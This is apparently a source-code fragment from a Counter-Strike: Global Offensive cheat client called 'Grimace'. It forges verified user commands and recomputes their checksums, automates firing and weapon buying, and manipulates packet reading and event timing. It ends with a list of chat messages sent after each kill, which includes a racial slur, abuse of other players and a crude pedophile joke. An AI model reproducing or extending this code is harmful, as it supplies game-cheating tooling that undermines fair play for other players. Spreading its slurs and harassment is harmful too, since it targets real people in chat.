			else if ( g_csgo.m_globals->m_curtime > g_ctx.m_enemy_body_pred )
			{
				g_ctx.m_enemy_body_pred = g_csgo.m_globals->m_curtime + 1.1f;
			}
		}
	}
}

void Client::print( Color text_color, const std::string text, ... )
{
	va_list     list;
	int         size;
	std::string buf;

	if ( text.empty() )
		return;

	va_start( list, text );

	// count needed size.
	size = std::vsnprintf( 0, 0, text.c_str(), list );

	// allocate.
	buf.resize( size );

	// print to buffer.
	std::vsnprintf( buf.data(), size + 1, text.c_str(), list );

	va_end( list );

	// print to console.
	g_csgo.m_cvar->ConsoleColorPrintf( g_Variables.m_colors[ "menu_accent_color" ], XOR( "[Grimace] " ) );
	g_csgo.m_cvar->ConsoleColorPrintf( text_color, buf.c_str() );
}

void Client::print( const std::string text, ... )
{
	print(colors::white, text);
}

void Client::QuickSwitch( CUserCmd* cmd )
{
	if ( !cmd->m_weapon_select || !g_Variables.m_bools[ "quickswitch" ] )
		return;

	int seq = std::max( m_usable_swap_command, g_csgo.m_cl->m_last_outgoing_command ) + 1;

	m_usable_swap_command = cmd->m_command_number;

	CUserCmd* old_cmd = g_csgo.m_input->GetUserCmd( seq );
	CVerifiedUserCmd* verified = g_csgo.m_input->GetVerifiedCmd( seq );

	if ( !old_cmd || !verified || old_cmd->m_command_number >= cmd->m_command_number )
		return;

	old_cmd->m_weapon_select = cmd->m_weapon_select;

	// dont select on our new command.
	cmd->m_weapon_select = 0;

	verified->m_cmd = *old_cmd;
	verified->m_crc = old_cmd->get_checksum();

	g_inputpred.update();
}

bool Client::CanFireWeapon()
{
	// the player cant fire.
	if ( g_csgo.m_globals->m_curtime < m_local->m_flNextAttack() || g_csgo.m_gamerules->m_bFreezePeriod() || g_ctx.m_flags & FL_FROZEN )
		return false;

	if ( m_weapon_type == WEAPONTYPE_GRENADE )
		return false;

	// if we have no bullets, we cant shoot.
	if ( m_weapon_type != WEAPONTYPE_KNIFE && m_weapon->m_iClip1() < 1 )
		return false;

	// do we have any burst shots to handle?
	if ( ( m_weapon_id == GLOCK || m_weapon_id == FAMAS ) && m_weapon->m_iBurstShotsRemaining() > 0 )
	{
		// new burst shot is coming out.
		if ( g_csgo.m_globals->m_curtime >= m_weapon->m_fNextBurstShot() )
			return true;
	}

	// yeez we have a normal gun.
	if ( g_csgo.m_globals->m_curtime >= m_weapon->m_flNextPrimaryAttack() )
		return true;

	return false;
}

void Client::AutoRevolver()
{
	if ( m_weapon_id != REVOLVER || m_cmd->m_buttons & IN_RELOAD )
	{
		m_need_revolver_timing = false;
		return;
	}

	m_need_revolver_timing = true;

	if ( g_csgo.m_globals->m_curtime <= g_ctx.m_revolver_time - g_csgo.m_globals->m_interval )
		m_cmd->m_buttons |= IN_ATTACK;
}

void Client::UpdateIncomingSequences()
{
	if ( !g_csgo.m_net )
		return;

	if ( m_sequences.empty() || g_csgo.m_net->m_in_seq > m_sequences.front().m_seq )
	{
		// store new stuff.
		m_sequences.emplace_front( g_csgo.m_globals->m_realtime, g_csgo.m_net->m_in_rel_state, g_csgo.m_net->m_in_seq );
	}

	// do not save too many of these.
	while ( m_sequences.size() > 2048 )
		m_sequences.pop_back();
}

void Client::BuyAwpBeforeKamiDoes( int cur_cmd )
{
	//auto end_delay = g_csgo.m_gamerules->get_gamerules();
	static ConVar* mp_round_restart_delay = g_csgo.m_cvar->FindVar( HASH( "mp_round_restart_delay" ) );

	float end_time = g_ctx.m_round_end_time + mp_round_restart_delay->GetFloat();

	// just add total rtt, since we also receive the event delayed too.
	float time_remaining = g_csgo.m_globals->m_curtime - ( end_time + g_ctx.m_latency + (g_csgo.m_cl->m_net_channel->GetLatency(INetChannel::FLOW_INCOMING)) );

	// dont really need to spam this one million times, should effectively be the same anyways lol.
	constexpr int max_usrcmds = 4;

	static int last_cmd;

	if ( time_remaining < ( max_usrcmds * g_csgo.m_globals->m_interval )
		&& cur_cmd != last_cmd )
	{
		g_csgo.m_engine->ExecuteClientCmd( XOR( "buy awp" ) );
		last_cmd = cur_cmd;
	}
}

void Client::FireClientEvents()
{
	for ( CEventInfo* it{ g_csgo.m_cl->m_events }; it != nullptr; it = it->m_next )
	{
		if ( !it->m_class_id )
			continue;

		it->m_fire_delay = 0.0f;
	}

	g_csgo.m_engine->FireEvents();
}

void Client::ReducePing(bool fn)
{
	if ( !g_csgo.m_cl || g_csgo.m_cl->m_next_message_time < 6 )
	{
		m_should_read_packets = true;
		return;
	}

	INetChannel* channel = g_csgo.m_engine->GetNetChannelInfo();
	if ( !channel || channel->IsLoopback() )
	{
		m_should_read_packets = true;
		return;
	}

	m_should_read_packets = true;
	g_csgo.CL_ReadPackets( fn );
	m_should_read_packets = false;

}

const char* bro[ 30 ] = {
	XOR( "say 1" ),
	XOR( "say ur shit" ),
	XOR( "say schizo" ),
	XOR( "say hhh " ),
	XOR( "say dude ur genuinely so dogshit like actually i cant imagine like bro like" ),
	XOR( "say LOL" ),
	XOR( "say 979 and u dump it dude how?XD" ),
	XOR( "say its not desync Bro its Twist" ),
	XOR( "say bro You cant doubletap LOL its LBY" ),
	XOR( "say bro needs an aura chug splash after dying like that" ),
	XOR( "say bro just copped an aura deficit" ),
	XOR( "say Bro just held that tap" ),
	XOR( "say I PRAY FOR BRO like bro imagine dying like that like bro LOL like genuinely" ),
	XOR( "say hahaha bro after missing like that and dying like bro genuinely like id quit like bro" ),
	XOR( "say bro Stop crying bro like genuinely like ur so shit like you didnt even get double tapped its 2018" ),
	XOR( "say bro like ACTUALLY ur so shit" ),
	XOR( "say bro I dont care dude like I dont care you are exploiting too you are using fake angles LOL" ),
	XOR( "say bro theres so many newgens Ive been playing since like 2019 and there was never this many" ),
	XOR( "say niggas think that using proxy means that you desync" ),
	XOR( "say you sweated so hard just to get headshot bro" ),
	XOR( "say yo i be listening to hella green day im Also A Fucking Pedophile" ),
	XOR( "say CL_ZeusLagCompensation 0" ),
	XOR( "say Bro rlly peaked it LOL" ),
	XOR( "say Bro rlly peaked a 1w nice" ),
	XOR( "say Thats literally a wallbang 1w moron" ),
	XOR( "say Hit Bro in the HITBOX_LORAX for 1337 damage" ),
	XOR( "say [moneybot] ---------ROUND-START---------" ),
	XOR( "say Its about time i taught you your place on the food chain" ),
	XOR( "say Bros Internot got Bit by shark so Lag" ),
	XOR( "say MY 666awpspike 1 tap" ),
};

void Client::HandleKillsays()
{
	if ( g_Variables.m_ints[ "chat_spam_type" ] == 0 )
		return;

	if ( g_ctx.m_last_kill_time < g_csgo.m_globals->m_curtime && g_ctx.m_last_kill_time > -100.f )
	{
		int rand = g_csgo.RandomInt( 0, _ARRAYSIZE( bro ) - 1 );
		g_csgo.m_engine->ExecuteClientCmd( bro[ rand ] );
		g_ctx.m_last_kill_time = -100.f; // idk just reset this bitty
	}
}